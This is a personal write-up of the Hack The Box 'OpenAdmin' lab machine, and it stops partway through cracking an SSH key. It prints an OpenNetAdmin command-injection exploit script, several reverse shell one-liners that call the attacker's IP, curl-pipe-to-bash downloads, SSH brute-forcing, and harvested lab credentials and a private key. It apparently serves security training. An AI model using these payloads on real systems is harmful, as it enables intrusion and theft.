# 📦 HTB | openadmin

Tags: #📦
Related to: 
See also: [[MySQL]], [[PHP]], [[awk]], [[bash]], [[burpsuite]], [[chmod chown]], [[curl]], [[echo]], [[find]], [[git]], [[gobuster]], [[grep]], [[gtfobins lolbas]], [[head]], [[ifconfig]], [[iptables]], [[medusa]], [[nano]], [[ncrack]], [[nc]], [[nmap]], [[peass]], [[ps]], [[python]], [[searchsploit]], [[sed]], [[ssh]], [[stty]], [[su]], [[sucrack]], [[tail]], [[vi vim]]
Previous: [[01 HTB/HTB]]

- [ ] official walkthrough
- [x] ippsec

## Enumeration

### Default script and version detection
	nmap -sC -sV -oA nmap/openadmin 10.129.1.145

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### View website

	firefox 10.129.1.145
	10.129.1.145/robots.txt

### Enumerate files & directories

See if page is PHP:

	10.129.1.145/index.html		// works
	10.129.1.145/index.php		// doesn't work
	10.129.1.145/index.asp		// doesn't work (wouldn't work on Linux)

	gobuster dir -u 10.129.1.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root.out
	
	dir		// directory/file enumeration mode
	-u 		// url string
	-w		// wordlist
	-o		// output file
	-x		// extensions (not using because it would take too long not knowing what extensions are on the server)

```bash
/music                (Status: 301) [Size: 312] [--> http://10.129.1.145/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.129.1.145/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.129.1.145/sierra/]
/server-status        (Status: 403) [Size: 277]
```

### View source code

Potential dependencies/plugins:

```
http://10.129.1.145/ona/		// OpenNetAdmin 18.1.1

10.129.1.145/music/
								// Colorlib
								// Owl Carousel 2.3.4
```

### Search for exploits

	searchsploit opennetadmin

```
OpenNetAdmin 13.03.01 - Remote Code Execution					| php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)	| php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution						| php/webapps/47691.sh
```

Examine exploit using $PAGER:

	searchsploit -x php/webapps/26682.txt

Copy exploit to the current working directory:

	searchsploit -m php/webapps/26682.txt

Review exploit source code:

	less 26682.txt

### Prepare exploit

Make  HTML page:
 
	vim index.hmtl
	
```
:set paste		// Prevents vim auto-indenting
				// Note: Pasting in insert mode automatically negates vim auto-indenting

:set nopaste	// Reverts to default
```

```html
<center>
<head>
<title>0wned Your Network</title>
<script type="text/javascript">
function changeaction()
{
    document.sploit.action = document.getElementById("url").value;
    alert('Remember, your shell must be accessed via
'+document.getElementById("url").value+'?module=mandat0ry');
}
</script>
</head>
<font size="5">OpenNetAdmin RCE Exploit</font><br />
<font size="2"><i>Now with leet button sploiting action! (oooh,
ahhh!)</i></font><br /><br />
<form action="/" method="post" name="sploit" onsubmit="changeaction()" >
URL: <input id="url" value="http://127.0.0.1/ona/dcm.php" size="50" /><br />
PHP Code to Execute: <input type="text" size="50" name="options[desc]"
value="<?php echo shell_exec($_GET[1]) ?>"/> <br />
<input type="hidden" name="module" value="add_module" />
<input type="hidden" name="options[name]" value="mandat0ry" />
<input type="hidden" name="options[file]"
value="../../../../../../../../../../../var/log/ona.log" />
<input type="submit" value="Exploit!" />
</form>
<b><i>Special thanks to: offsec, twitches, funkenstein, zachzor,
av1dmage, drc, arsinh, and the coders for OpenNetAdmin!</i></b>
</center> 
```

### Create HTTP server to serve PHP exploit

	python3	-m http.server 80	// Python 3

### Send exploit through Burp proxy

Test in regular browser:

	localhost	// Run in firefox

Run in Burp:

1. Make sure Burp "Intercept is on".
2. "Open Browser" and browse to localhost.
3. Burp => Proxy => Forward to load exploit html from server into browser.
4. Change exploit "URL" from localhost to target in Firefox.
5. Change PHP to something benign to test with:

```
From:	<?php echo shell_exec($_GET[1]) ?>

To:		<?php echo("Please Subscribe"); ?>
```

6. "Exploit!"
7. Change Raw POST

```
From:	POST / HTTP/1.1

To:		POST /ona/dcm.php HTTP/1.1
```

```php
POST /ona/dcm.php HTTP/1.1
Host: localhost
Content-Length: 209
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

options%5Bdesc%5D=%3C%3Fphp+echo%28%22Please+Subscribe%22%29%3B+%3F%3E&module=add_module&options%5Bname%5D=mandat0ry&options%5Bfile%5D=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fona.log
```

8. <Ctrl+R> to send to Repeater.
9. <Ctrl+Shift+R> to switch to Repeater tab.
10. Burp Repeater => upper right, above inspector - Change exploit from localhost to target (10.129.187.158 Port: 80).
11. Send.

Note: This particular exploit (wrong target version) fails.

### Exploit OpenNetAdmin 18.1.1

Update searchsploit:

	searchsploit -u

Choose another exploit:

	searchsploit opennetadmin

```
OpenNetAdmin 13.03.01 - Remote Code Execution					| php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)	| php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution						| php/webapps/47691.sh
```

Copy exploit to the current working directory:

	searchsploit -m php/webapps/47691.sh

Prepare exploit:

	mv 47691.sh exploit.sh
	vim exploit.sh
	
```bash
#!/bin/bash
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Put exploit's curl through a proxy (using -x) since we don't know what it does:

```bash
#!/bin/bash
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl -x 'http://127.0.0.1:8080' --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Here's how the script works:

	curl
	xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E	// payload
	echo \"BEGIN\";${cmd};echo \"END\"	// echo BEGIN and END between the command we run
	sed -n -e '/BEGIN/,/END/ p'			// it send that to sed and grabs everything between BEGIN and END

Run through bash using target address:

	bash exploit.sh 10.129.187.158
	whoami

<Ctrl+R> to send to Repeater.
<Ctrl+Shift+R> to switch to Repeater tab.

Change POST to /ona/:

```php
POST /ona/ HTTP/1.1
Host: 10.129.187.158
User-Agent: curl/7.79.1
Accept: */*
Content-Length: 130
Content-Type: application/x-www-form-urlencoded
Connection: close

xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";whoami;echo "END"&xajaxargs[]=ping
```

Send.
Search Response for BEGIN:

```
BEGIN
www-data
END
```

Turn Intercept off

Terminal:

	id	// uid=33(www-data) gid=33(www-data) groups=33(www-data)

Foothold
----
Let's get a proper reverse shell because currently this sends an HTTP request every time we want to do something which isn't great for a command like "su -" we don't have a full TTY.

Start netcat listener locally:

	nc -lvnp 9001	// listening on [any] 9001 ...

Get local VPN IP address:

	ifconfig tun0	// 10.10.14.120
	
	// Note:
	// My reverse shell attempts failed from using the wrong tun# IP address!!
	// Apparently I had tun0, tun1, and tun2 from orphaned OpenVPN processes battling
	// over control of TUN devices. I fixed this by rebooting my attacker machine.

Send reverse shell from local Kali, through a tcp socket destined towards the HTB VPN tunnel, over the tcp port number nc is listening to:

	bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'	// For some reason this reverse shell isn't working.

The victim computer has netcat installed so, let's start the same netcat listener locally and connect to it from the victim machine:

	which nc
	nc 10.10.14.120 9001	// This connects so we know it's not the firewall. So it's probably the above command.


There are a lot of bad characters in the bash reverse shell command, so let's convert that to base 64 and run it on the victim machine:

	echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'"
	echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'" | base64	// YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvOTAwMSAwPiYxJw==

On victim machine:

	echo -n YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvOTAwMSAwPiYxJw== | base64 -d | bash

That didn't work either. Let's try other reverse shells:

	nc -e /bin/sh 10.10.14.120 9001
	nc -h
	nc -h 2>1
	nc -h 2>&1
	which bash
	
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.120 9001 >/tmp/f

That didn't work either. Maybe there's an IPtables rule? That one normally works. Let's try a Python reverse shell:

	cd www
	vim test.py
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.120",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

On victim machine:

	curl 10.10.14.120/test.py			// this worked
	
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.120",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Direct that to bash:

	curl 10.10.14.120/test.py | bash	// nothing

Note: Why can't www-data get a reverse shell?

	which bash
	ls -la /bin/bash		// everyone has permission to execute /bin/bash, so that's not the problem
	echo test | grep test	// the pipe works
	echo blah | grep test	// we don't have any bad characters

Edit test.py to:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.120",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Run on victim:

	curl 10.10.14.120/test.py | python
	curl 10.10.14.120/test.py | python3

```bash
connect to [10.10.14.120] from (UNKNOWN) [10.129.189.9] 39476
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

### Upgrade terminal for improved functionality (arrow keys, etc.)

	www-data@curling:/var/www/html/templates/protostar$ ^[[D^[[A^[[C^[[D^[[A^[[C

	which python
	which python3
	
Spawn a bash terminal:

	python3 -c 'import pty;pty.spawn("/bin/bash")'

Background it:

	<Ctrl+Z>

Change terminal line settings:

	stty raw -echo;fg
	
	raw		// same as -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr -icrnl -ixon -ixoff -icanon -opost -isig -iuclc -ixany -imaxbel -xcase min 1 time 0
	-echo	// echo input characters
	;fg		// plays nice with zsh

Enable clear screen functionality:

	export TERM=xterm

### Investigate IPtables

	cd /etc
	find . | grep iptab
	
```
find: './polkit-1/localauthority': Permission denied
find: './ssl/private': Permission denied
```

	iptables -L		// list all rules in the selected chain. If no chain is selected, all chains are listed.

```
iptables v1.6.1: can't initialize iptables table `filter': Permission denied (you must be root)
Perhaps iptables or your kernel needs to be upgraded.
```

	cd -	// go to previous directory

## Lateral Movement

## Privilege Escalation

### PEASS - Privilege Escalation Awesome Scripts SUITE:

	cd /opt
	git clone https://github.com/Tib3rius/privilege-escalation-awesome-scripts-suite [^1]
	git pull	// to just update it

Run on victim machine:

	cd linPEAS
	cp linpeas.sh ~/HTB/machines/openadmin/www
	python3 -m http.server 80
	curl 10.10.14.120/linpeas.sh | bash

Notes:

	- Kernel compile date:	Nov 12 10:36:11 UTC 2019
	- MySQL port 3306
	- /var/log/ona.log

### Look at MySQL:

	cd /opt/ona
	find . | grep config
	cd www/config
	cat config.inc.php
	cat config.inc.php | grep -i pass
	cat config.inc.php | grep -i mysql
	cat config.inc.php | grep -i sql
	cd ..
	grep -R -i password .
	grep -R -i password . | grep -i sql
	mysql -u root
	mysql -u root -p	// try passwords
	cd local/config
	cat database_settings.inc.php
	
```
ona_sys                                                                                   
n1nj4W4rri0R!
```

	mysql -u ona_sys -p
			ona_sys
			n1nj4W4rri0R!

	show databases;
	
```bash
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)
```

	use users;	// ERROR 1044 (42000): Access denied for user 'ona_sys'@'localhost' to database 'users'
	use mysql;	// ERROR 1044 (42000): Access denied for user 'ona_sys'@'localhost' to database 'mysql'
	use ona_default;

```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

	show tables;

```bash
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.01 sec)
```

	describe users;
	
```bash
	+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.00 sec)
```

	select id, username, password from users;
	
```bash
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
```

Search for cracked hash. [^2]

	098f6bcd4621d373cade4e832627b4f6:test
	21232f297a57a5a743894a0e4a801fc3:admin

	exit

Try dumping users:

	SELECT User FROM mysql.user;	// ERROR 1142 (42000): SELECT command denied to user 'ona_sys'@'localhost' for table 'user'
	mysql -u root -p	// try n1nj4W4rri0R!	// ERROR 1698 (28000): Access denied for user 'root'@'localhost'

### Make users and passwords lists

	cat /etc/passwd | grep bash | awk  -F: '{print $1}'	// grep everyone who has a bash shell

Save usernames:

	vi users.txt
	
```
root
jimmy
joanna
```

Save passwords:

	vi passwords.txt
	
```
n1nj4W4rri0R!
test
admin
```

### Set TTY row and column count

Get TTY row and column count:

	stty -a	// rows 64; columns 117;	// from working terminal

Set row and column count:

	stty rows 65 cols 117				// to target terminal

### Attempt SSH logins

	medusa -h 10.129.189.141 -U users.txt -P passwords.txt -M ssh 10.129.189.141

```bash
-h [TEXT]    : Target hostname or IP address
-U [FILE]    : File containing usernames to test
-P [FILE]    : File containing passwords to test
-M [TEXT]    : Name of the module to execute (without the .mod extension)


ACCOUNT FOUND: [ssh] Host: 10.129.189.141 User: jimmy Password: n1nj4W4rri0R! [SUCCESS]
```

If we don't have SSH on our box, we can perform this on another box using sucrack:

	cp /usr/bin/sucrack www
	cd /dev/shm
	wget 10.10.14.120/sucrack
	chmod +x sucrack
	vi passwords.txt
	
```
n1nj4W4rri0R!
test
admin
```

	./sucrack -a -w 20 -s 10 -u jimmy -rl AFLafld passwords.txt

	ssh jimmy@10.129.189.141	// n1nj4W4rri0R!

### Logged into jimmy account

	ps -ef				// see every process on the system using standard syntax
	ls -la				// list all directory contents in a list
	find . -type f -ls	// list files in ls -dils format
	
```bash
394400      4 -rw-------   1 jimmy    jimmy           7 Nov 22  2019 ./.local/share/nano/search_history
394394      4 -rw-r--r--   1 jimmy    jimmy        3771 Apr  4  2018 ./.bashrc
393946      0 -rw-r--r--   1 jimmy    jimmy           0 Nov 21  2019 ./.cache/motd.legal-displayed
394395      4 -rw-r--r--   1 jimmy    jimmy         807 Apr  4  2018 ./.profile
394396      4 -rw-r--r--   1 jimmy    jimmy         220 Apr  4  2018 ./.bash_logout
```

Find SUID files:

	find / -perm -4000 -ls 2>/dev/null	// nothing interesting

Find user's files:

	find / -user jimmy -ls 2>/dev/null

```bash
   286763      4 drwxrwx---   2 jimmy    internal     4096 Nov 23  2019 /var/www/internal
   282830      4 -rwxrwxr-x   1 jimmy    internal      339 Nov 23  2019 /var/www/internal/main.php
     2644      4 -rwxrwxr-x   1 jimmy    internal      185 Nov 23  2019 /var/www/internal/logout.php
     1387      4 -rwxrwxr-x   1 jimmy    internal     3229 Nov 22  2019 /var/www/internal/index.php
```
	
Are we missing something...?

Show socket statistics:

	ss -lntp
	
```bash
State         Recv-Q         Send-Q                  Local Address:Port                    Peer Address:Port         
LISTEN        0              128                     127.0.0.53%lo:53                           0.0.0.0:*            
LISTEN        0              128                           0.0.0.0:22                           0.0.0.0:*            
LISTEN        0              80                          127.0.0.1:3306                         0.0.0.0:*            
LISTEN        0              128                         127.0.0.1:52846                        0.0.0.0:*            
LISTEN        0              128                              [::]:22                              [::]:*            
LISTEN        0              128                                 *:80                                 *:*
```

	127.0.0.1:52846 <= high port number

	cat /var/www/internal/main.php

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

We probably have to create a session:

	curl 127.0.0.1:52846/main.php

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

We get an SSH private key above because of a programming mistake in the main.php file.

Expected behavior:

1. Browse to main.php
2. Check if authenticated.
3. If not authenticated, kill the connection.

```
FROM:	if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
TO:		if (!isset ($_SESSION['username'])) { header("Location: /index.php"; die); };
```

	curl -vvv 127.0.0.1:52846/main.php	// before adding the die code we're told to redirect to index.php but the script continues to run anyways
	
```
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 52846 (#0)
> GET /main.php HTTP/1.1
> Host: 127.0.0.1:52846
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Tue, 14 Dec 2021 13:02:51 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Set-Cookie: PHPSESSID=n8b5j3fru3egal534rr0ns38p7; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Location: /index.php
< Content-Length: 1902
< Content-Type: text/html; charset=UTF-8
< 
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
* Connection #0 to host 127.0.0.1 left intact
```

	curl -v 127.0.0.1:52846/main.php	// after adding the die code
	
```
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 52846 (#0)
> GET /main.php HTTP/1.1
> Host: 127.0.0.1:52846
> User-Agent: curl/7.58.0
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 500 Internal Server Error
< Date: Tue, 14 Dec 2021 12:50:50 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
* Closing connection 0
```

Drop into SSH command mode and local port forward:

	~C
	-L 9002:127.0.0.1:52846	// local port forward

Firefox:

```
http://localhost:9002/			// index.html authentication page
http://localhost:9002/main.php	// reads header and redirects to index.html
```

Another attack vector: Hash Collision

cat /var/www/internal/index.php:

```php
...
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              }
```

A password SHA512 hashed to the value above will allow jimmy to log in. Knowing this information, we can potentially find a hash collision - a known password whose hash collides with the jimmy account, allowing access. 

	echo -n 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 | wc -c	// 128 hash length

Note the comparison operation between the password and the hash in the code above. PHP has the ==  (loose type comparison) and === operators.

	php -a
```php
Interactive mode enabled
php > if (0 == "00e123asd") {	// with loose type comparison, PHP reads 0e as zero to the exponent which is always going to be 0
php {
php {   echo "match";
php { }
match
```

	php -a
```php
Interactive mode enabled
php > if (0 === "00e123asd") {
php {   echo "match";
php { }

```

Again, with loose type comparison, all we have to do is find a hash collision with this: 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 [^3]

	vi ssh.key
	:set paste	// paste ssh key and save
	chmod 600 ssh.key // (R=4 + W=2 + X=0) = RW permission for owner and nothing for anyone else

### Use Joanna's SSH private key

	ssh -i ssh.key joanna@10.129.183.214	// ninja does not work as the password
	
Crack SSH password:

	cp /usr/share/john/ssh2john.py .
	./ssh2john.py ssh.key > openadmin.ssh	// prepare ssh key for john

```
